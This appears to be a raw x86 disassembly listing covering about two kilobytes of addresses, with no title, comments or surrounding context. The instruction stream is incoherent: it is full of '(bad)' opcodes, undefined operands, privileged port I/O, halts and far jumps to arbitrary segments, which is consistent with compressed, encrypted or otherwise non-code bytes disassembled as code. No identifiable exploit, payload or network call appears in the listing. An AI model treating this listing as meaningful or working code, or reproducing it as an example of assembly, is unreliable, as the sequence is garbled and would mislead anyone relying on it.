  420547:	mov    WORD PTR [esi+0x0],gs
  42054a:	pop    ss
  42054b:	mov    eax,0x34948cce
  420550:	cmp    al,0xdd
  420552:	adc    al,0xaa
  420554:	sahf   
  420555:	fbstp  TBYTE PTR [ebx-0x1c]
  420558:	xchg   BYTE PTR [esp+ebx*1],al
  42055b:	out    dx,eax
  42055c:	enter  0x6fff,0x83
  420560:	add    bl,BYTE PTR [esi]
  420562:	fnstcw WORD PTR gs:[ecx-0x1e20ee6d]
  420569:	fisubr DWORD PTR [ecx-0x651d5df4]
  42056f:	ds cli 
  420571:	in     eax,dx
  420572:	xor    eax,0x2c6813f1
  420577:	icebp  
  420578:	inc    ecx
  420579:	test   DWORD PTR [edi],edi
  42057b:	fistp  QWORD PTR [esi-0x30]
  42057e:	(bad)  
  42057f:	push   0x228da988
  420584:	dec    ebp
  420585:	ds push eax
  420587:	sub    esp,ebp
  420589:	adc    BYTE PTR [ecx+esi*8-0x4f],dh
  42058d:	fbld   TBYTE PTR [edx+0x597ad0ba]
  420593:	adc    esi,DWORD PTR [ebx+eax*2-0x22d4d488]
  42059a:	pop    esp
  42059b:	stos   BYTE PTR es:[edi],al
  42059c:	in     eax,dx
  42059d:	adc    edi,ebp
  42059f:	sub    esp,DWORD PTR [edi-0x4210d47b]
  4205a5:	xlat   BYTE PTR ds:[ebx]
  4205a6:	dec    edx
  4205a7:	push   esi
  4205a8:	and    al,0x4d
  4205aa:	jle    0x42060f
  4205ac:	sahf   
  4205ad:	out    dx,al
  4205ae:	xor    DWORD PTR [ecx-0x19],ebx
  4205b1:	jmp    0x420538
  4205b3:	jp     0x4205fc
  4205b5:	ficomp WORD PTR [edi]
  4205b7:	and    esi,DWORD PTR [ebx+0x711a9da7]
  4205bd:	fstp   DWORD PTR [edx]
  4205bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205c0:	ins    BYTE PTR es:[edi],dx
  4205c1:	stos   DWORD PTR es:[edi],eax
  4205c2:	shl    BYTE PTR [ebx-0xc],cl
  4205c5:	(bad)  
  4205c7:	cmp    bl,bl
  4205c9:	cld    
  4205ca:	inc    esi
  4205cb:	sub    esi,DWORD PTR [ebx]
  4205cd:	out    dx,al
  4205ce:	xor    al,0x91
  4205d0:	sub    DWORD PTR [eax+0x227109b],edi
  4205d6:	and    ebx,DWORD PTR [ecx-0x21]
  4205d9:	adc    BYTE PTR [eax+0x5b7f2521],0x41
  4205e0:	pop    ebp
  4205e1:	inc    ebp
  4205e2:	mov    ds:0x7be2d9fc,al
  4205e7:	and    al,0x5b
  4205e9:	test   BYTE PTR [eax+edx*8+0x6e],ah
  4205ed:	aas    
  4205ee:	cmp    bl,BYTE PTR [ecx]
  4205f0:	sbb    eax,0xf956ea66
  4205f5:	loopne 0x420624
  4205f7:	mov    BYTE PTR [edi],ch
  4205f9:	mov    ebx,DWORD PTR [eax-0x2c]
  4205fc:	int    0xdf
  4205fe:	jae    0x420591
  420600:	jnp    0x420672
  420602:	push   ds
  420603:	sbb    BYTE PTR [ebp-0x218e3d56],ch
  420609:	push   es
  42060a:	ror    BYTE PTR [ecx-0x13265fd9],cl
  420610:	jl     0x42066e
  420612:	je     0x42059a
  420614:	out    dx,eax
  420615:	imul   esi,DWORD PTR [ecx+0x9],0x53
  420619:	mov    esp,0x8d765f50
  42061e:	psubb  mm3,QWORD PTR [edx+0x6b2dd4e]
  420625:	test   DWORD PTR gs:[edi],ebx
  420628:	aaa    
  420629:	xor    al,0x49
  42062b:	cmp    BYTE PTR ds:0x58c03bfd,ah
  420631:	sbb    ebp,esi
  420633:	xchg   ebx,eax
  420634:	sub    DWORD PTR [eax+eiz*2-0x7f],edx
  420638:	or     cl,ch
  42063a:	in     eax,0xd2
  42063c:	call   0xe4c1:0x2202cc10
  420643:	mov    dl,0xb7
  420645:	(bad)  
  420646:	mov    bh,0x7
  420648:	jae    0x420616
  42064a:	es aam 0x75
  42064d:	call   0xb9e0515e
  420652:	cdq    
  420653:	call   0xc3dcd09b
  420658:	pushf  
  420659:	sbb    DWORD PTR [ebp+0x1f31c766],esp
  42065f:	dec    edi
  420660:	adc    al,0x6d
  420662:	stc    
  420663:	add    eax,0xaf72c628
  420668:	das    
  420669:	(bad)  [edx+esi*8-0x65db11d5]
  420670:	stc    
  420671:	retf   
  420672:	pushf  
  420673:	push   0x15ab29ee
  420678:	fld    DWORD PTR [esi-0x48]
  42067b:	hlt    
  42067c:	xchg   edx,eax
  42067d:	(bad)  
  42067e:	aad    0xc1
  420680:	inc    esi
  420681:	xchg   ecx,eax
  420682:	mov    cl,0x2a
  420684:	push   0x30be0872
  420689:	(bad)  
  42068b:	or     eax,0x2a2511b3
  420690:	scas   al,BYTE PTR es:[edi]
  420691:	cs test eax,0xcef8a5cc
  420697:	cmc    
  420698:	dec    edi
  420699:	dec    eax
  42069a:	adc    eax,DWORD PTR [eax-0x4880adfa]
  4206a0:	or     eax,0x82f3c35
  4206a5:	and    esi,DWORD PTR [edx+0x23b2a603]
  4206ab:	cdq    
  4206ac:	jnp    0x4206e0
  4206ae:	jae    0x4206da
  4206b0:	mov    bl,0x91
  4206b2:	mov    eax,0xdd5f07d8
  4206b7:	fistp  WORD PTR [edx]
  4206b9:	dec    ebx
  4206ba:	fs cld 
  4206bc:	gs dec edx
  4206be:	addr16 stc 
  4206c0:	mov    ss,WORD PTR ds:0xa5b434f6
  4206c6:	sbb    DWORD PTR cs:[edx+0x70],eax
  4206ca:	inc    edi
  4206cb:	jecxz  0x420674
  4206cd:	jle    0x42068a
  4206cf:	ins    DWORD PTR es:[edi],dx
  4206d0:	test   al,0x8d
  4206d2:	int3   
  4206d3:	cwde   
  4206d4:	call   0xd57f5b27
  4206d9:	push   cs
  4206da:	push   0x8b1b6aa8
  4206df:	xchg   esp,eax
  4206e0:	add    bh,BYTE PTR ds:0x9191b628
  4206e7:	mov    ss,ebp
  4206e9:	jbe    0x420730
  4206eb:	outs   dx,BYTE PTR ds:[esi]
  4206ec:	jmp    0xc17e:0xfb0710d2
  4206f3:	test   BYTE PTR [eax+0x11],0x8d
  4206f7:	data16 fcom DWORD PTR [edx+edx*2+0x5f]
  4206fc:	test   BYTE PTR [ebx-0x4197a7],0xd9
  420703:	ins    BYTE PTR es:[edi],dx
  420704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420705:	mov    ebx,0x87e40abe
  42070a:	mov    bl,0xaf
  42070c:	rcr    DWORD PTR [ecx],1
  42070e:	(bad)  
  42070f:	shr    BYTE PTR [ebp+0x7050a33b],cl
  420715:	sub    al,0x42
  420717:	cmc    
  420718:	add    al,0xf4
  42071a:	pop    ss
  42071b:	popa   
  42071c:	jmp    0xfd0c:0xa82cae74
  420723:	stc    
  420724:	add    ebx,DWORD PTR [edi+0x65716710]
  42072a:	pop    esp
  42072b:	sub    eax,0x3715f09c
  420730:	push   esi
  420731:	cmp    eax,0xe6df553d
  420736:	ret    
  420737:	push   ss
  420738:	mov    eax,ds:0x1c6a01ef
  42073d:	or     BYTE PTR [ecx-0x7b99872a],0x3e
  420744:	sub    al,0x87
  420746:	xchg   ecx,eax
  420747:	mov    ch,0xb3
  420749:	mov    bh,ch
  42074b:	xor    ebx,DWORD PTR [esi-0x78]
  42074e:	inc    edx
  42074f:	dec    ebp
  420750:	in     al,dx
  420751:	loopne 0x42073b
  420753:	je     0x42079b
  420755:	mov    ebp,0xfb9b768a
  42075a:	push   0xffffff84
  42075c:	cmp    esi,DWORD PTR [ecx+edi*2]
  42075f:	jns    0x42076d
  420761:	mov    ds:0x20f7af49,eax
  420766:	add    al,BYTE PTR [edi-0x76]
  420769:	dec    esp
  42076a:	jl     0x4207b7
  42076c:	(bad)  
  42076d:	xor    esp,ebx
  42076f:	jb     0x4207e6
  420771:	test   DWORD PTR [ebx+0x7b],ebx
  420774:	sub    al,dh
  420776:	ret    
  420777:	aas    
  420778:	mov    bl,bh
  42077a:	mov    ebx,0x1fbd93a9
  42077f:	mov    edx,0xde45ffc2
  420784:	adc    ecx,DWORD PTR [edi+0x4809091]
  42078a:	cmp    DWORD PTR [edi-0x1],0xe77b84df
  420791:	xchg   edi,eax
  420792:	shr    DWORD PTR [esi+0x7a01b287],cl
  420798:	ins    DWORD PTR es:[edi],dx
  420799:	sbb    al,0x6e
  42079b:	xchg   edx,eax
  42079c:	popf   
  42079d:	mov    ds:0x80660ec8,eax
  4207a2:	popf   
  4207a3:	mov    ecx,0x7597ac94
  4207a8:	les    esp,FWORD PTR [edx-0x45]
  4207ab:	je     0x42078e
  4207ad:	cmc    
  4207ae:	call   0x1070b990
  4207b3:	enter  0xcdbf,0x78
  4207b7:	stos   DWORD PTR es:[edi],eax
  4207b8:	mov    esp,0x9b12dff9
  4207bd:	scas   eax,DWORD PTR es:[edi]
  4207be:	and    DWORD PTR [eax+0x44],ebp
  4207c1:	xchg   esp,eax
  4207c2:	dec    eax
  4207c3:	adc    BYTE PTR [eax],al
  4207c5:	mov    dh,0x2
  4207c7:	test   DWORD PTR [edi+0xfccfb33],edi
  4207cd:	pop    es
  4207ce:	int    0x85
  4207d0:	fwait
  4207d1:	adc    DWORD PTR [ebp+0x4b539520],ebx
  4207d7:	mov    esp,0x790b6323
  4207dc:	jne    0x42083b
  4207de:	add    bl,BYTE PTR [edx+0xa2ed869]
  4207e4:	xor    ah,BYTE PTR [ecx-0x3dfb7a93]
  4207ea:	mov    esp,0x1156e85a
  4207ef:	aaa    
  4207f0:	and    BYTE PTR [ecx+0xc],ch
  4207f3:	mov    ecx,0xe0f5371f
  4207f8:	add    ebp,edi
  4207fa:	in     al,0xc1
  4207fc:	fwait
  4207fd:	or     DWORD PTR [eax-0x5e],eax
  420800:	adc    DWORD PTR ds:0x2fd26bdc,esi
  420806:	cwde   
  420807:	xchg   ebp,eax
  420808:	push   0x6f20a3d3
  42080d:	inc    eax
  42080e:	jae    0x420809
  420810:	cwde   
  420811:	lods   eax,DWORD PTR ds:[esi]
  420812:	scas   al,BYTE PTR es:[edi]
  420813:	inc    ecx
  420814:	dec    esp
  420815:	or     al,0x5
  420817:	jp     0x420869
  420819:	cmp    eax,0xe25f091d
  42081e:	jl     0x420816
  420820:	xchg   BYTE PTR [edi-0x51],cl
  420823:	xchg   ebx,eax
  420824:	mov    cl,al
  420826:	pop    ebp
  420827:	aam    0x29
  420829:	ss out dx,eax
  42082b:	mov    edx,0xd60686ee
  420830:	sbb    ah,BYTE PTR [ecx-0x47]
  420833:	dec    edx
  420834:	fisubr DWORD PTR [esi-0x2649eee]
  42083a:	dec    edx
  42083b:	iret   
  42083c:	stos   DWORD PTR es:[edi],eax
  42083d:	sub    ecx,edx
  42083f:	cld    
  420840:	mov    bh,0x8f
  420842:	mov    ebp,0x72594497
  420847:	sub    ah,bl
  420849:	sub    eax,0xa285053a
  42084e:	jge    0x420854
  420850:	push   ds
  420851:	ret    
  420852:	xlat   BYTE PTR ds:[ebx]
  420853:	ror    ecx,cl
  420855:	inc    esi
  420856:	lock xor eax,0x8857ddcb
  42085c:	popa   
  42085d:	cs popa 
  42085f:	mov    WORD PTR [eax+0x0],?
  420862:	mov    cl,0xe3
  420864:	add    edx,DWORD PTR [edx+ebp*4+0x72]
  420868:	pop    edx
  420869:	adc    cl,0x14
  42086c:	rol    DWORD PTR [ecx+eiz*1-0x6bd30759],1
  420873:	das    
  420874:	fimul  WORD PTR [esi+0x640d815d]
  42087a:	sbb    DWORD PTR [edx],0xbd6eefa2
  420880:	push   es
  420881:	xor    dl,bl
  420883:	dec    edi
  420884:	push   ds
  420885:	fistp  DWORD PTR [esi]
  420887:	mov    ch,0x51
  420889:	call   DWORD PTR [edi+edi*4-0x5db17b25]
  420890:	dec    esi
  420891:	jle    0x4208f8
  420893:	lahf   
  420894:	fucomi st,st(3)
  420896:	pusha  
  420897:	push   cs
  420898:	inc    edi
  420899:	in     eax,dx
  42089a:	dec    eax
  42089b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42089c:	sub    eax,0xfa6c5bcf
  4208a1:	aam    0x45
  4208a3:	jge    0x420890
  4208a5:	sbb    al,cl
  4208a7:	cmp    edx,DWORD PTR [eax+0x1e20b67]
  4208ad:	cmp    DWORD PTR [edx],edi
  4208af:	mov    eax,0x894cfd3c
  4208b4:	clc    
  4208b5:	sbb    esi,eax
  4208b7:	lock retf 
  4208b9:	jmp    0x4208c6
  4208bb:	xor    edx,DWORD PTR [eax+0xd189cdd]
  4208c1:	sbb    al,0x4c
  4208c3:	int3   
  4208c4:	mov    bh,0x6f
  4208c6:	gs mov ecx,0xcd909e14
  4208cc:	leave  
  4208cd:	jae    0x4208ee
  4208cf:	or     edi,DWORD PTR [edi-0xf5dff0c]
  4208d5:	jb     0x420946
  4208d7:	leave  
  4208d8:	ret    0xb3c8
  4208db:	inc    ecx
  4208dc:	push   ecx
  4208dd:	jns    0x420871
  4208df:	mov    dh,0x95
  4208e1:	push   0xffffff94
  4208e3:	retf   0xfae1
  4208e6:	mov    ds:0xaea1b90d,eax
  4208eb:	scas   al,BYTE PTR es:[edi]
  4208ec:	jg     0x4208b6
  4208ee:	mov    ?,edx
  4208f0:	cld    
  4208f1:	mul    DWORD PTR [edi-0x5eefc4d]
  4208f7:	sub    edx,esi
  4208f9:	outs   dx,BYTE PTR es:[esi]
  4208fb:	pop    ds
  4208fc:	mov    ah,0xad
  4208fe:	jle    0x42092e
  420900:	aam    0x66
  420902:	cs inc esi
  420904:	enter  0x4bc,0xd8
  420908:	in     eax,dx
  420909:	jb     0x4208e3
  42090b:	bound  ebp,QWORD PTR [ebp-0x3c]
  42090e:	push   esp
  42090f:	xchg   BYTE PTR [ebx],al
  420911:	jl     0x4208ae
  420913:	stos   BYTE PTR es:[edi],al
  420914:	sub    al,dl
  420916:	(bad)  
  420917:	loopne 0x420909
  420919:	mov    dh,0x34
  42091b:	std    
  42091c:	sub    al,BYTE PTR [esi+0x5ed88da9]
  420922:	and    ax,0x4e48
  420926:	call   0x31a1:0xc2284185
  42092d:	push   ds
  42092e:	test   al,0x1a
  420930:	imul   eax,edi,0xdbd70e4c
  420936:	cmc    
  420937:	mov    ebp,esp
  420939:	stos   DWORD PTR es:[edi],eax
  42093a:	jb     0x420992
  42093c:	sub    ch,cl
  42093e:	in     al,dx
  42093f:	call   0x72a43f70
  420944:	fwait
  420945:	pop    ebx
  420946:	cs pop edx
  420948:	nop
  420949:	jne    0x4209c7
  42094b:	out    dx,al
  42094c:	shl    DWORD PTR [edx-0x4f],0x91
  420950:	rcl    BYTE PTR [ebx+0x33],1
  420953:	cld    
  420954:	dec    esi
  420955:	icebp  
  420956:	call   0x49685380
  42095b:	inc    esp
  42095c:	cwde   
  42095d:	sub    esi,DWORD PTR [ebx-0x1aa26520]
  420963:	xor    BYTE PTR [ebp+edi*1-0x5f],dh
  420967:	sbb    eax,0x9bf285f1
  42096c:	xlat   BYTE PTR ds:[ebx]
  42096d:	jae    0x420986
  42096f:	sub    ecx,DWORD PTR [ecx+0x12]
  420972:	cmc    
  420973:	ins    BYTE PTR es:[edi],dx
  420974:	adc    ch,BYTE PTR [ebx]
  420976:	shl    BYTE PTR [edi-0x66],cl
  420979:	fadd   DWORD PTR [esi-0x56]
  42097c:	fst    QWORD PTR [ebx]
  42097e:	shr    DWORD PTR [eax],cl
  420980:	addr16 add ebp,edx
  420983:	add    DWORD PTR [edx],esi
  420985:	add    eax,0x81f71729
  42098a:	dec    ecx
  42098b:	sar    BYTE PTR [esi+eiz*1],0x45
  42098f:	adc    edi,esi
  420991:	shl    dl,1
  420993:	push   es
  420994:	fcmovbe st,st(4)
  420996:	loop   0x420939
  420998:	addr16 int3 
  42099a:	inc    ebp
  42099b:	addr16 icebp 
  42099d:	inc    ecx
  42099e:	add    eax,0x46a10855
  4209a3:	xchg   BYTE PTR [esi],ah
  4209a5:	stos   BYTE PTR es:[edi],al
  4209a6:	leave  
  4209a7:	xchg   esi,eax
  4209a8:	jnp    0x4209fe
  4209aa:	mov    cs,WORD PTR [ecx]
  4209ac:	aam    0xf2
  4209ae:	inc    esi
  4209af:	cmp    DWORD PTR [ecx-0x6861d170],0xffffff81
  4209b6:	mov    eax,0x8241fc5c
  4209bb:	push   ecx
  4209bc:	jb     0x4209f6
  4209be:	imul   edx,DWORD PTR [ebx+0x22],0xf9a97c5e
  4209c5:	push   ebx
  4209c6:	cmp    BYTE PTR [esi-0x2c],al
  4209c9:	inc    eax
  4209ca:	and    BYTE PTR [ebx+0x8],bl
  4209cd:	mov    BYTE PTR [edx+0x77],cl
  4209d0:	jne    0x42098b
  4209d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209d3:	mov    edx,0x1df3b5a
  4209d8:	mov    edi,0x545a41bc
  4209dd:	outs   dx,DWORD PTR ds:[esi]
  4209de:	push   cs
  4209df:	push   esp
  4209e0:	mov    bh,0x59
  4209e2:	pusha  
  4209e3:	retf   0x2b7d
  4209e6:	dec    esp
  4209e7:	cli    
  4209e8:	xchg   edx,eax
  4209e9:	clc    
  4209ea:	rcr    ch,0x98
  4209ed:	scas   eax,DWORD PTR es:[edi]
  4209ee:	std    
  4209ef:	mov    edi,ecx
  4209f1:	inc    esi
  4209f2:	dec    ecx
  4209f3:	mov    edi,0x5c5475d4
  4209f8:	iret   
  4209f9:	mov    al,0xb1
  4209fb:	add    ecx,DWORD PTR [ecx]
  4209fd:	out    dx,al
  4209fe:	xchg   ebp,eax
  420a00:	iret   
  420a01:	and    al,BYTE PTR [edi+eax*2+0x510728fb]
  420a08:	call   0x797b3ac6
  420a0d:	inc    esi
  420a0e:	pop    ecx
  420a0f:	or     al,0xfe
  420a11:	mov    ds:0x383c7eac,al
  420a16:	add    BYTE PTR [ecx+esi*1+0x451702a2],dh
  420a1d:	imul   esi,ebx,0xffffffed
  420a20:	in     al,dx
  420a21:	cmp    bh,BYTE PTR [esi]
  420a23:	rol    DWORD PTR [edx+0x35],0x24
  420a27:	and    BYTE PTR [esi+0x1c24cb6a],cl
  420a2d:	add    ch,BYTE PTR [edx]
  420a2f:	pop    esi
  420a30:	out    dx,al
  420a31:	(bad)  
  420a32:	aam    0xfb
  420a34:	stos   DWORD PTR es:[edi],eax
  420a35:	xor    eax,0xddfc924
  420a3a:	retf   0x90b0
  420a3d:	in     eax,dx
  420a3e:	sti    
  420a3f:	dec    edi
  420a40:	shl    ebx,cl
  420a42:	repnz xchg ecx,eax
  420a44:	inc    edx
  420a45:	mov    cl,0xce
  420a47:	mov    ah,0x29
  420a49:	ret    0xb996
  420a4c:	and    ebx,DWORD PTR ss:[esi]
  420a4f:	mov    edi,0xe2723224
  420a54:	in     eax,0x3c
  420a56:	xchg   ebx,eax
  420a57:	sbb    ebx,DWORD PTR [ecx+0x4febfc6a]
  420a5d:	mov    dh,BYTE PTR [ecx-0x14]
  420a60:	sub    BYTE PTR [ebx],dh
  420a62:	ficom  DWORD PTR [ebp-0x1561efe8]
  420a68:	outs   dx,BYTE PTR ds:[esi]
  420a69:	xor    edi,ebp
  420a6b:	repnz shr DWORD PTR [edi],1
  420a6e:	dec    esp
  420a6f:	or     eax,0xf5259be1
  420a74:	(bad)
  420a77:	xor    esi,0x19
  420a7a:	sub    DWORD PTR [ebx+ebx*1-0xc1e15b7],ebx
  420a81:	xchg   DWORD PTR [esi*1-0x7041d6e4],ecx
  420a88:	popf   
  420a89:	push   es
  420a8a:	mov    ebp,0x709527fb
  420a8f:	gs pop ecx
  420a91:	fild   QWORD PTR [eax]
  420a93:	mov    ch,0xf1
  420a95:	pop    esp
  420a96:	mov    cl,0xf0
  420a98:	xchg   ebx,eax
  420a99:	cmp    esi,DWORD PTR [edx+0x3e]
  420a9c:	sbb    esp,ebx
  420a9e:	mov    ch,0x62
  420aa0:	clc    
  420aa1:	or     BYTE PTR [edi-0x24],al
  420aa4:	int3   
  420aa5:	mov    edi,0x232f533d
  420aaa:	call   0x61f1:0x1306a3bb
  420ab1:	test   BYTE PTR [esi],0xac
  420ab4:	mov    ebp,0x1eba4cd8
  420ab9:	mov    bh,0x7b
  420abb:	pop    ds
  420abc:	sub    BYTE PTR ds:0xcdf9f4da,cl
  420ac2:	fld    st(3)
  420ac4:	out    0xb2,al
  420ac6:	inc    eax
  420ac7:	jl     0x420b3e
  420ac9:	loopne 0x420ac0
  420acb:	aas    
  420acc:	mov    WORD PTR [edi-0x77],ss
  420acf:	pusha  
  420ad0:	lods   al,BYTE PTR ds:[esi]
  420ad1:	dec    esp
  420ad2:	loop   0x420a83
  420ad4:	call   0x8e77:0x7edc18ce
  420adb:	cli    
  420adc:	je     0x420ac2
  420ade:	push   ecx
  420adf:	loope  0x420b0f
  420ae1:	sub    dh,BYTE PTR [ecx]
  420ae3:	in     al,0x1e
  420ae5:	or     eax,0x675f9fa4
  420aea:	fsubr  DWORD PTR [ecx-0x78b204f9]
  420af0:	xchg   ebx,eax
  420af1:	jmp    0xeb26d50a
  420af6:	xchg   esp,eax
  420af7:	push   ebp
  420af8:	outs   dx,BYTE PTR ds:[esi]
  420af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420afa:	popf   
  420afb:	xlat   BYTE PTR ds:[ebx]
  420afc:	mov    ecx,0x45f53c12
  420b01:	and    DWORD PTR ds:0x65f5a4b,edi
  420b07:	push   ebp
  420b08:	mov    bh,0xe0
  420b0a:	repz dec ebp
  420b0c:	mov    esp,DWORD PTR [eax-0x61737719]
  420b12:	in     al,0xe0
  420b14:	rcl    BYTE PTR [edi+0x8],1
  420b17:	rcl    esp,0xf6
  420b1a:	sbb    esi,edi
  420b1c:	sti    
  420b1d:	adc    al,0x5a
  420b1f:	xchg   ebx,eax
  420b20:	sbb    al,0x48
  420b22:	mov    cl,0x9e
  420b24:	jmp    0xa6ef:0x6ddb08de
  420b2b:	test   al,0xaf
  420b2d:	mov    eax,ds:0x946739cb
  420b32:	and    BYTE PTR [ebx-0x4280bfae],dl
  420b38:	or     ebp,DWORD PTR [esi-0x538e39a9]
  420b3e:	jbe    0x420baa
  420b40:	inc    esp
  420b41:	mov    ebx,?
  420b43:	push   ecx
  420b44:	jle    0x420bc1
  420b46:	in     al,0x7a
  420b48:	pusha  
  420b49:	mov    ds:0x9f0ce0fd,al
  420b4e:	out    dx,eax
  420b4f:	cmp    DWORD PTR [esi-0x37],ecx
  420b52:	push   ss
  420b53:	cld    
  420b54:	popa   
  420b55:	dec    ebp
  420b56:	aaa    
  420b57:	in     eax,0x16
  420b59:	sbb    DWORD PTR [ecx+0x64],0x98f1d18e
  420b60:	dec    esi
  420b61:	lahf   
  420b62:	je     0x420ae4
  420b64:	sub    ch,BYTE PTR [ebp+0x6ef34838]
  420b6a:	sar    cl,0x0
  420b6d:	js     0x420b2b
  420b6f:	iret   
  420b70:	push   ss
  420b71:	xor    eax,0xa85553ef
  420b76:	xchg   esi,eax
  420b77:	jmp    0x420bd9
  420b79:	pop    ebx
  420b7a:	jge    0x420b87
  420b7c:	es out 0xe8,al
  420b7f:	mov    al,ds:0x516d910
  420b84:	cmp    eax,DWORD PTR [eax+0x5a]
  420b87:	pop    esi
  420b88:	icebp  
  420b89:	out    0x34,al
  420b8b:	dec    edx
  420b8c:	jno    0x420b1e
  420b8e:	jmp    0x420bf5
  420b90:	mov    dl,0x15
  420b92:	rcr    dl,1
  420b94:	imul   esi,DWORD PTR [eax+0x9],0xffffffa7
  420b98:	shr    edx,0x4b
  420b9b:	inc    ebp
  420b9c:	retf   
  420b9d:	adc    BYTE PTR [ebx+edx*1-0x19],ch
  420ba1:	aas    
  420ba2:	ja     0x420bed
  420ba4:	enter  0x816e,0xf9
  420ba8:	xchg   DWORD PTR [eax],edi
  420baa:	push   edi
  420bab:	cvtdq2ps xmm3,xmm3
  420bae:	xchg   edi,eax
  420baf:	mov    es,WORD PTR [ebp+0x33]
  420bb2:	mov    WORD PTR [edi],?
  420bb4:	mov    ch,0x31
  420bb6:	std    
  420bb7:	(bad)  
  420bb8:	sub    DWORD PTR [eax-0x53ffd681],ebx
  420bbe:	(bad)  
  420bbf:	fdivr  DWORD PTR [eax+eax*1+0x52]
  420bc3:	retf   
  420bc4:	mov    ds:0x92bad885,eax
  420bc9:	test   ebx,ebx
  420bcb:	sub    al,0x30
  420bcd:	mov    al,0x3f
  420bcf:	adc    dl,BYTE PTR [ebx]
  420bd1:	adc    ch,BYTE PTR [eax]
  420bd3:	jle    0x420b5e
  420bd5:	add    DWORD PTR [ebx-0x29f4a738],ecx
  420bdb:	or     dh,cl
  420bdd:	enter  0xee40,0x6d
  420be1:	inc    ecx
  420be2:	push   edi
  420be3:	push   eax
  420be4:	sbb    ebp,edx
  420be6:	loope  0x420c33
  420be8:	test   BYTE PTR [bx+0x4],ch
  420bec:	repz fisubr DWORD PTR [eax]
  420bef:	adc    BYTE PTR [edi-0x5497abe9],ah
  420bf5:	lahf   
  420bf6:	xchg   cl,cl
  420bf8:	test   BYTE PTR [edi-0x35],dh
  420bfb:	scas   eax,DWORD PTR es:[edi]
  420bfc:	dec    esi
  420bfd:	or     al,0xb2
  420bff:	hlt    
  420c00:	sub    edx,DWORD PTR [ecx]
  420c02:	push   edx
  420c03:	pop    esp
  420c04:	or     edi,DWORD PTR ds:0x221d694e
  420c0a:	cwde   
  420c0b:	and    dh,cl
  420c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c0e:	(bad)  
  420c0f:	pushf  
  420c10:	scas   al,BYTE PTR es:[edi]
  420c11:	mov    edx,ebx
  420c13:	add    BYTE PTR [edx-0x727df9a2],0xa7
  420c1a:	scas   al,BYTE PTR es:[edi]
  420c1b:	mov    edi,0xde422836
  420c20:	jg     0x420c00
  420c22:	in     eax,0xe3
  420c24:	ja     0x420c8f
  420c26:	xlat   BYTE PTR ds:[ebx]
  420c27:	mov    edi,0x50694039
  420c2c:	and    DWORD PTR [esp+eiz*8],ebx
  420c2f:	fs push edi
  420c31:	or     eax,0xf0c1c39
  420c36:	dec    eax
  420c37:	div    DWORD PTR [edx+0x5d]
  420c3a:	jo     0x420c3d
  420c3c:	xchg   ecx,eax
  420c3d:	outs   dx,DWORD PTR ds:[esi]
  420c3e:	mov    cl,0xc7
  420c40:	das    
  420c41:	arpl   WORD PTR [edx],bx
  420c43:	es add al,0x27
  420c46:	and    al,0xc3
  420c48:	mov    esi,DWORD PTR [edi+ebx*8]
  420c4b:	es scas al,BYTE PTR es:[edi]
  420c4d:	adc    eax,0xce6cfa0b
  420c52:	cmp    DWORD PTR ds:0x81821174,edx
  420c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c59:	mov    esp,0x76d257ed
  420c5e:	dec    esi
  420c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c60:	xor    BYTE PTR [eax-0x684dc09a],bh
  420c66:	jle    0x420c13
  420c68:	(bad)  
  420c69:	and    esp,DWORD PTR [esi]
  420c6b:	imul   eax,DWORD PTR [ebp+0x19],0xffffff93
  420c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c70:	xor    bh,BYTE PTR [eax]
  420c72:	sbb    DWORD PTR ds:0xde5ec46e,ebp
  420c78:	inc    esi
  420c79:	jne    0x420cd3
  420c7b:	in     al,dx
  420c7c:	sti    
  420c7d:	(bad)  
  420c7e:	loope  0x420cbb
  420c80:	fbstp  TBYTE PTR [esi+0x12]
  420c83:	into   
  420c84:	loopne 0x420c0c
  420c86:	mov    BYTE PTR [esi-0x22],bh
  420c89:	or     edi,edi
  420c8b:	or     al,0x2c
  420c8d:	mov    ebx,0x13d8b9e8
  420c92:	and    BYTE PTR [edx-0x11912695],ah
  420c98:	addr16 dec esp
  420c9a:	or     esp,DWORD PTR [eax-0xca1b17e]
  420ca0:	jne    0x420d17
  420ca2:	pop    ecx
  420ca3:	sahf   
  420ca4:	les    ebp,FWORD PTR [ecx+0x6180bfae]
  420caa:	and    al,0xd0
  420cac:	stos   BYTE PTR es:[edi],al
  420cad:	jns    0x420c59
  420caf:	scas   eax,DWORD PTR es:[edi]
  420cb0:	xchg   ebx,eax
  420cb1:	enter  0xf935,0x3
  420cb5:	pop    ebp
  420cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cb7:	mov    dh,0x36
  420cb9:	lea    edx,[ecx]
  420cbb:	mov    ch,0x5e
  420cbd:	dec    ebx
  420cbe:	jecxz  0x420cee
  420cc0:	bndldx (bad),[ebx+0xb7ed97b]
  420cc7:	mov    al,0x5b
  420cc9:	sub    bl,BYTE PTR [ecx]
  420ccb:	push   esi
  420ccc:	sbb    al,0x93
  420cce:	test   BYTE PTR [ebx+0x69],al
  420cd1:	sbb    DWORD PTR [edx-0x17753a67],ebp
  420cd7:	push   es
  420cd8:	or     al,0x19
  420cda:	and    al,bh
  420cdc:	xor    eax,0xe6716fb8
  420ce1:	sbb    eax,0x82036bed
  420ce6:	mov    edi,0xc439464f
  420ceb:	jo     0x420cb3
  420ced:	dec    ebp
  420cee:	jmp    0xa7c9:0x7c9847bf
  420cf5:	cld    
  420cf6:	call   FWORD PTR [eax+0x69]
  420cf9:	(bad)  
  420cfa:	out    dx,al
  420cfb:	xchg   edx,eax
  420cfc:	and    dl,BYTE PTR [eax+0x3664d8fa]
  420d02:	mov    WORD PTR [ecx+0x7a],gs
  420d05:	dec    eax
  420d06:	xchg   edx,eax
  420d07:	jbe    0x420c99
  420d09:	sbb    al,0x16
  420d0b:	loope  0x420cab
  420d0d:	push   es
  420d0e:	or     al,BYTE PTR [edx+0x5dc4f76]
  420d14:	mov    DWORD PTR [edx-0x60562eb0],esp
  420d1a:	enter  0x5469,0x9c
  420d1e:	pop    edi
  420d1f:	and    esp,DWORD PTR [eax+0x15]
